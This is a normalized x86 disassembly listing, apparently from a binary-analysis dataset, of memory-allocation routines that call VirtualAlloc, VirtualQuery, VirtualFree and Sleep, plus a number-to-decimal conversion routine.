mov edx esi
sub edx ebx
mov eax [ esp + 0x10 ]
cmp edx eax
jae r-xdata
mov edx edi
sub edx 0x10
and eax 0xfffffff0
add edx eax
mov [ esp ] edx
push 0x1c
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
call VirtualQuery
cmp [ esp + 0x14 ] 0x10000
jne r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_445b44
mov eax edi
call sub_446304
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
cmp ebp 0x40a2c
jbe r-xdata
mov edx ebp
sub edx ebx
add edx 0x10000
dec edx
and edx 0xffff0000
mov ebx edx
cmp eax ebx
jae r-xdata
mov eax edi
sub eax 0x10
mov eax [ eax + 0x8 ]
mov edx ebx
mov ecx edi
xchg ecx eax
call sub_445b14
mov eax edi
call sub_446304
jmp r-xdata
mov eax ebx
sub eax 0x10
mov [ eax + 0x8 ] esi
push 0x4
push 0x2000
push ebx
mov eax [ esp + 0xc ]
push eax
call VirtualAlloc
test eax eax
je r-xdata
mov ebx eax
push 0x4
push 0x1000
push ebx
mov eax [ esp + 0xc ]
push eax
call VirtualAlloc
test eax eax
je r-xdata
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
mov edx eax
add ebx [ edx + 0xc ]
or ebx 0x8
mov [ edx + 0xc ] ebx
mov ebx edi
jmp r-xdata
sub_445f80
lea edx [ eax + 0x3 ]
shr edx 0x3
cmp eax 0xa2c
push ebx
mov cl [ rw-data ]
ja r-xdata
cmp eax 0x40a2c
ja r-xdata
test cl cl
movzx eax [ edx + rw-data ]
lea ebx [ eax * 8 + rw-data ]
jne r-xdata
pop ebx
test eax eax
jns r-xdata
lea ebx [ eax + 0xd3 ]
and ebx 0xffffff00
add ebx 0x30
test cl cl
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx 0xfffffff8
cmp edx ebx
je r-xdata
push ebx
push esi
push edi
push ebp
mov ebp eax
lea esi [ ebp + 0x10010 ]
dec esi
add esi 0x4
and esi 0xffff0000
push 0x4
push 0x101000
push esi
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea edx [ ebx - 0xb30 ]
mov ecx edx
shr edx 0xd
shr ecx 0x8
mov eax 0xffffffff
shl eax cl
and eax [ edx * 4 + rw-data ]
je r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x10 ]
movzx ecx [ ebx + 0x2 ]
add ecx eax
cmp eax [ ebx + 0xc ]
ja r-xdata
add [ edx + 0xc ] 0x1
and ecx [ eax - 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ eax - 0x4 ] edx
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov [ edi + 0x8 ] ebp
or esi 0x4
mov [ edi + 0xc ] esi
call sub_445ce4
mov eax [ rw-data ]
mov [ edi ] rw-data
mov [ rw-data ] ebx
mov [ edi + 0x4 ] eax
mov [ eax ] ebx
mov [ rw-data ] 0x0
add ebx 0x10
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xfffffffe
mov ecx edx
shl eax cl
and eax [ rw-data ]
je r-xdata
and ecx 0xffffffe0
bsf eax eax
or ecx eax
jmp r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
add [ edx + 0xc ] 0x1
mov [ ebx + 0x8 ] ecx
mov [ ebx ] 0x0
mov [ eax - 0x4 ] edx
pop ebx
retn
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] ebx
mov [ ebx + 0x4 ] ecx
mov [ ebx ] 0x0
pop ebx
retn
mov [ ebx ] 0x0
pop ebx
retn
push 0x0
call Sleep
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov ecx [ rw-data ]
sub ecx ebx
jb r-xdata
bsf edx eax
mov eax [ edx * 4 + rw-data ]
bsf ecx eax
mov eax edx
shl eax 0x5
or ecx eax
jmp r-xdata
push esi
push edi
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov [ eax ] edi
cmp edi eax
jne r-xdata
sub ebx 0x40
pause
cmp [ rw-data ] 0x0
jne r-xdata
movsx esi [ ebx + 0x1 ]
and esi [ rw-data ]
je r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
push 0xa
call Sleep
jmp r-xdata
mov eax ebx
call sub_445c6c
mov eax [ rw-data ]
sub eax ebx
mov [ rw-data ] eax
mov [ rw-data ] ecx
or ebx 0x2
mov [ eax - 0x4 ] ebx
jmp r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
mov edx edi
sub edx ebx
je r-xdata
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
push 0x0
call Sleep
mov eax 0x100
[ ebx ] ah
je r-xdata
movzx ecx [ ebx + 0x18 ]
mov edi [ rw-data ]
cmp edi ecx
jb r-xdata
bsf eax esi
lea esi [ eax * 8 ]
mov ecx [ eax * 4 + rw-data ]
bsf ecx ecx
lea ecx [ ecx + esi * 4 ]
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ edx ] edi
cmp edi edx
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
and [ edi + esi - 0x4 ] 0xf7
lea eax [ ebx + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jb r-xdata
btr [ rw-data ] edx
push 0xa
call Sleep
jmp r-xdata
movzx eax [ ebx + 0x1a ]
mov edi eax
call sub_445c6c
mov esi eax
test eax eax
jne r-xdata
mov esi [ rw-data ]
movzx ecx [ ebx + 0x1a ]
lea edx [ ecx + 0xb30 ]
cmp edi edx
jb r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
cmp edi 0x10a60
jb r-xdata
mov edx 0xfffffffe
rol edx cl
and [ eax * 4 + rw-data ] edx
jne r-xdata
push 0x0
call Sleep
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea ecx [ ebx + 0x2 ]
mov [ esi - 0x4 ] ecx
mov [ rw-data ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_445ba0
jmp r-xdata
lea ecx [ edi + 0x6 ]
mov [ esi - 0x4 ] ecx
xor eax eax
mov [ rw-data ] al
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] 0x1
mov [ ebx + 0x10 ] esi
lea eax [ esi + 0x20 ]
movzx ecx [ ebx + 0x2 ]
lea edx [ ecx + eax ]
mov [ ebx + 0x8 ] edx
add edi esi
sub edi ecx
mov [ ebx + 0xc ] edi
mov [ ebx ] 0x0
mov [ eax - 0x4 ] esi
pop edi
pop esi
pop ebx
retn
mov [ rw-data ] al
mov [ ebx ] al
pop edi
pop esi
pop ebx
retn
sub esi edi
sub [ rw-data ] edi
mov [ rw-data ] esi
jmp r-xdata
mov edi ecx
and [ edi + esi - 0x4 ] 0xf7
mov edx edi
movzx edi [ ebx + 0x1a ]
sub edx edi
lea eax [ edi + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
call sub_445ba0
jmp r-xdata
btr [ rw-data ] eax
push 0xa
call Sleep
jmp r-xdata
sub_446304
mov edx [ eax - 0x4 ]
test dl 0x7
mov ecx eax
push ebx
mov bl [ rw-data ]
jne r-xdata
test dl 0x5
jne r-xdata
test bl bl
mov ebx [ edx ]
jne r-xdata
pop ebx
test dl 0x3
je r-xdata
and edx 0xfffffff0
test bl bl
mov ebx edx
push esi
mov esi eax
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
sub [ edx + 0xc ] 0x1
mov eax [ edx + 0x8 ]
je r-xdata
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov esi eax
sub esi 0x10
call sub_445ce4
mov eax esi
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0xc ]
test dl 0x8
jne r-xdata
mov eax 0xffffffff
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ ebx + esi - 0x4 ] 0x1
mov ecx [ ebx + esi - 0x4 ]
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
test eax eax
je r-xdata
test eax eax
mov [ edx + 0x8 ] ecx
lea eax [ eax + 0x1 ]
mov [ ecx - 0x4 ] eax
je r-xdata
mov ebx esi
mov ebp edx
and ebp 0xfffffff0
xor edi edi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebx + esi ]
and ecx 0xfffffff0
add ebx ecx
cmp ecx 0xb30
jb r-xdata
or ecx 0x8
mov [ ebx + esi - 0x4 ] ecx
push ecx
push edx
push 0x0
call Sleep
pop edx
pop ecx
mov eax 0x100
[ ebx ] ah
je r-xdata
mov [ ebx + 0xc ] eax
mov eax [ edx + 0x14 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x14 ] eax
xor eax eax
cmp [ ebx + 0x10 ] edx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edx + 0x14 ] ebx
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x14 ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx ] 0x0
xor eax eax
pop ebx
retn
xor eax eax
mov [ ebx ] al
pop ebx
retn
mov esi [ esp + 0x14 ]
cmp ebp esi
jbe r-xdata
or edi 0xffffffff
jmp r-xdata
or edi 0xffffffff
jmp r-xdata
xor edi edi
jmp r-xdata
push 0x0
call Sleep
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ esi - 0x4 ] 0x8
jne r-xdata
call sub_445b60
jmp r-xdata
mov ecx [ esi - 0x8 ]
sub esi ecx
add ebx ecx
cmp ecx 0xb30
jb r-xdata
cmp ebx 0x13ffe0
je r-xdata
push ecx
push edx
push 0xa
call Sleep
pop edx
pop ecx
jmp r-xdata
mov [ ebx ] al
mov eax edx
mov edx [ edx - 0x4 ]
mov bl [ rw-data ]
jmp r-xdata
test edi edi
jne r-xdata
sub ebp esi
add ebx esi
jmp r-xdata
push 0xa
call Sleep
jmp r-xdata
mov eax esi
call sub_445b60
jmp r-xdata
cmp [ rw-data ] 0x13ffe0
jne r-xdata
lea eax [ ebx + 0x3 ]
mov [ esi - 0x4 ] eax
mov [ ebx + esi - 0x8 ] ebx
mov eax esi
mov edx ebx
call sub_445ba0
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax edi
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp ]
mov [ eax ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
mov [ eax + 0x4 ] edx
push 0x1c
lea eax [ esp + 0xc ]
push eax
push ebx
call VirtualQuery
push 0x8000
push 0x0
push ebx
call VirtualFree
test eax eax
jne r-xdata
lea ebx [ esi + 0x13ffe0 ]
call sub_445c00
mov [ ebx - 0x4 ] 0x2
mov [ rw-data ] 0x13ffe0
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub esi 0x10
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ rw-data ] 0x0
push 0x8000
push 0x0
push esi
call VirtualFree
cmp eax 0x1
sbb eax eax
pop esi
pop ebx
retn
sub_4464fc
mov ecx [ eax - 0x4 ]
test cl 0x7
push ebx
push esi
mov esi eax
jne r-xdata
test cl 0x5
jne r-xdata
mov ebx [ ecx ]
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
cmp ecx edx
jb r-xdata
pop esi
pop ebx
test cl 0x3
je sub_445e34
mov ebx ecx
and ecx 0xfffffff0
push edi
lea edi [ ecx + eax ]
sub ecx 0x4
and ebx 0xf
cmp edx ecx
push ebp
ja r-xdata
lea ecx [ ecx + ecx + 0x20 ]
push edi
mov edi edx
xor eax eax
sub ecx edx
adc eax 0xffffffff
and eax ecx
add eax edx
call sub_445f80
test eax eax
je r-xdata
lea ebx [ edx * 4 + 0x40 ]
cmp ebx ecx
jb r-xdata
xor eax eax
retn
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
lea ebp [ edx + edx ]
cmp ebp ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi 0x40a2c
jbe r-xdata
mov ebx edx
mov eax edx
call sub_445f80
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
add eax edx
mov ebp eax
mov edi ecx
push edx
call sub_445f80
pop edx
test eax eax
je r-xdata
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
cmp edx 0xb2c
jae r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
mov edx eax
mov edi eax
mov eax esi
call [ ebx + 0x1c ]
mov eax esi
call sub_446304
mov eax edi
mov [ eax - 0x8 ] edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx eax
mov ebx eax
mov eax esi
call sub_445b44
mov eax esi
call sub_446304
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp 0x40a2c
jbe r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea ebp [ edx + 0xd3 ]
and ebp 0xffffff00
add ebp 0x30
add ecx 0x4
sub ecx ebp
cmp [ rw-data ] 0x0
je r-xdata
cmp edx 0x2cc
jb r-xdata
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_445b14
mov eax esi
call sub_446304
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ eax - 0x8 ] edx
cmp eax 0xb30
jb r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebx ebp
mov [ esi - 0x4 ] ebx
mov ebx ecx
mov edx [ edi - 0x4 ]
test dl 0x1
jne r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov edi edx
mov eax edx
call sub_445f80
test eax eax
je r-xdata
mov edx 0xb2c
cmp ecx edx
jbe r-xdata
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
lea eax [ edx + eax + 0xd3 ]
and eax 0xffffff00
add eax 0x30
lea edx [ ebp + 0x4 ]
sub edx eax
ja r-xdata
mov eax edi
push ecx
push edx
call sub_445b60
pop edx
pop ecx
mov ebx 0xf
and ebx [ esi - 0x4 ]
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax edi
and edx 0xfffffff0
add ebx edx
add edi edx
cmp edx 0xb30
jb r-xdata
or edx 0x8
mov [ edi - 0x4 ] edx
jmp r-xdata
mov ebx 0xf
and ebx [ esi - 0x4 ]
pause
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_445b44
mov eax esi
call sub_446304
mov eax ebp
mov [ esi + ebp - 0x4 ] edx
lea edi [ edx + 0x3 ]
mov [ eax + esi - 0x4 ] edi
mov ebp eax
cmp edx 0xb30
jb r-xdata
and [ esi + ebp ] 0xfffffff7
add ebp 0x4
jmp r-xdata
mov [ rw-data ] 0x0
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
push ecx
push edx
push 0x0
call Sleep
pop edx
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov [ edi - 0x8 ] ebx
lea eax [ ebx + 0x3 ]
mov [ esi + ebp - 0x4 ] eax
cmp ebx 0xb30
jb r-xdata
call sub_445b60
push ecx
push 0x0
call Sleep
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebp ebx
mov [ esi - 0x4 ] ebp
mov [ rw-data ] 0x0
mov eax esi
add eax esi
call sub_445ba0
push ecx
push edx
push 0xa
call Sleep
pop edx
pop ecx
jmp r-xdata
mov [ rw-data ] 0x0
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ esi + ebp ]
mov edx ebx
call sub_445ba0
push ecx
push 0xa
call Sleep
pop ecx
jmp r-xdata
sub_446814
push ebx
lea ebx [ eax - 0x1 ]
and ebx 0xfffffffc
call sub_445f80
cmp eax 0x1
sbb ecx ecx
lea edx [ ebx + eax ]
or ebx ecx
cmp ebx 0x40a2c
jae r-xdata
pop ebx
retn
neg ebx
fldz
fst [ ebx + edx ]
add ebx 0x8
js r-xdata
mov [ edx ] ecx
ffree st0
fincstp
sub_446848
mov ecx eax
mov edx ecx
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
add edx ecx
mov eax edx
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
test edx edx
jne r-xdata
retn
xor eax eax
sub_44686c
cmp [ rw-data ] 0x0
je r-xdata
add eax 0x10
retn
mov edx [ rw-data ]
cmp edx eax
jb r-xdata
mov edx eax
add edx 0x13fff0
cmp edx [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x13ffe0
je r-xdata
xor eax eax
mov eax [ rw-data ]
jmp r-xdata
retn
sub_4468ac
push ebx
push esi
mov ebx eax
add ebx 0x20
mov [ edx ] ebx
mov edx [ eax ]
cmp eax [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov ebx esi
sub ebx 0x4
mov ebx [ ebx ]
and ebx 0xfffffff0
add ebx esi
movzx eax [ edx + 0x2 ]
sub ebx eax
mov [ ecx ] ebx
pop esi
pop ebx
retn
mov ebx [ edx + 0x8 ]
cmp ebx [ edx + 0xc ]
jbe r-xdata
mov eax [ edx + 0x8 ]
dec eax
mov [ ecx ] eax
pop esi
pop ebx
retn
sub_4468e8
push edi
mov edi edx
add eax 0x1
mov edx 0x89705f41
mul edx
shr eax 0x1e
mov ecx edx
and edx 0x1fffffff
shr ecx 0x1d
lea edx [ edx + edx * 4 ]
add edx eax
mov eax ecx
or eax 0x30
mov [ edi ] al
mov eax edx
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1c
and edx 0xfffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1b
and edx 0x7ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1a
and edx 0x3ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x19
and edx 0x1ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x18
and edx 0xffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x17
and edx 0x7fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x16
and edx 0x3fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x15
and edx 0x1fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x14
or eax 0x30
mov [ edi ] al
lea eax [ edi + 0x1 ]
pop edi
retn
sub_446a1c
push ebx
mov ebx edx
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
pop ebx
retn
add eax 0xffffffc8
mov eax [ eax ]
movzx ecx [ eax ]
inc eax
mov edx ebx
call sub_446a04
pop ebx
retn
sub_446a50
push ebp
mov ebp esp
push ebx
mov edx eax
cmp edx 0xffff
jbe r-xdata
xor eax eax
test dl 0x3
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx eax
cmp edx ecx
ja r-xdata
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov [ edx - 0x10 ] ecx
push 0x1c
mov edx [ ebp + 0x8 ]
add edx 0xffffffe4
push edx
push eax
call VirtualQuery
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
add edx [ ebx - 0x10 ]
add ecx 0x4
cmp edx ecx
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x1000
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x4
jb r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
test [ eax - 0x8 ] 0xf6
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax - 0x7 ] 0x1
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
sub_446acc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp edi 0x3e8
jge r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffa8
call sub_446a50
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffd0
call sub_446a50
pop ecx
test al al
je r-xdata
mov eax ebx
add eax 0xffffffd0
mov esi [ eax ]
mov eax ebx
add eax 0xffffffa8
cmp ebx [ eax ]
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_446a50
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ edi + 0x1 ]
mov eax [ esi ]
call sub_446acc
pop ecx
test al al
jne r-xdata
sub_446b4c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx [ eax ]
xor eax eax
mov [ ebp - 0x10 ] eax
push ebp
xor edx edx
mov eax ebx
call sub_446acc
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
sub_446b74
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
setne al
retn
push 0x4
push 0x1000
push 0x10000
push 0x0
call VirtualAlloc
mov [ rw-data ] eax
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_4459d4
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call Sleep
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_4459d4
test al al
je r-xdata
push 0xa
call Sleep
sub_446be8
push ebx
mov ebx eax
call sub_446b74
test al al
je r-xdata
xor eax eax
mov eax [ rw-data ]
cmp [ eax ] 0x3ffe
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ rw-data ]
mov [ edx + eax * 4 + 0x4 ] ebx
mov eax [ rw-data ]
inc [ eax ]
mov al 0x1
jmp r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
sub_446c28
push ebx
push esi
push edi
mov esi eax
mov edi rw-data
xor ebx ebx
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call sub_446b74
test al al
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
dec edx
test edx edx
jl r-xdata
mov [ rw-data ] 0x0
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ edi ]
mov edx [ edx ]
mov ecx [ edi ]
mov edx [ ecx + edx * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 + 0x4 ] edx
mov edx [ edi ]
dec [ edx ]
mov bl 0x1
jmp r-xdata
mov ecx [ edi ]
cmp esi [ ecx + eax * 4 + 0x4 ]
jne r-xdata
sub_446c80
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax rw-data
shr eax 0x5
shl eax 0x8
mov edx [ ebp + 0x8 ]
lea esi [ edx + eax * 8 - 0x1b800 ]
lea ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4468ac
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x28 ]
jbe r-xdata
mov eax [ ebp - 0x24 ]
sub eax 0x4
test [ eax ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
add [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
call sub_446c28
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1b801 ] 0x0
xor ebx ebx
mov eax [ ebp - 0x24 ]
call sub_446b4c
mov edi eax
test edi edi
jne r-xdata
mov ebx 0x3
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x4 ] 0x100
jge r-xdata
cmp ebx 0xff
jg r-xdata
cmp [ esi + ebx * 8 ] 0x0
je r-xdata
inc [ esi + ebx * 8 + 0x4 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x2 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x1
je r-xdata
xor ebx ebx
mov [ esi + ebx * 8 ] edi
jmp r-xdata
inc ebx
cmp ebx 0xff
jle r-xdata
mov eax [ ebp - 0xc ]
inc eax
imul [ ebp - 0x14 ]
add eax 0xc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
cmp edi [ esi + ebx * 8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
sub eax 0x4
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov [ ebp - 0x1d ] 0x1
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0xc
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax 0xc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
test eax eax
jle r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x20
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x20
jae r-xdata
mov ebx 0x2
jmp r-xdata
mov [ ebp - 0x1d ] al
add [ ebp - 0x1c ] 0x2
dec [ ebp - 0x2c ]
jne r-xdata
mov al 0x1
mov ebx 0x1
jmp r-xdata
mov [ ebp - 0x1d ] al
inc [ ebp - 0x18 ]
dec [ ebp - 0x2c ]
jne r-xdata
mov al 0x1
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
sub_446e40
push ebp
mov ebp esp
push eax
mov eax 0x27
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff7e0
push ebx
push esi
push edi
lea eax [ ebp - 0x1b800 ]
xor ecx ecx
mov edx 0x1b800
call sub_447ae4
lea eax [ ebp - 0x1f824 ]
xor ecx ecx
mov edx 0x4000
call sub_447ae4
xor eax eax
mov [ ebp - 0x1b808 ] eax
mov [ ebp - 0x1b801 ] 0x1
mov edi [ rw-data ]
jmp r-xdata
cmp edi rw-data
jne r-xdata
mov eax edi
call sub_44686c
mov ebx eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov edi [ edi + 0x4 ]
mov eax ebx
sub eax 0x4
mov esi [ eax ]
test esi 0x1
jne r-xdata
cmp ebx rw-data
je r-xdata
mov eax ebx
call sub_446848
mov ebx eax
test ebx ebx
jne r-xdata
test esi 0x4
je r-xdata
cmp [ ebp - 0x1b801 ] 0x0
jne r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jl r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jge r-xdata
push ebp
mov eax ebx
call sub_446c80
pop ecx
jmp r-xdata
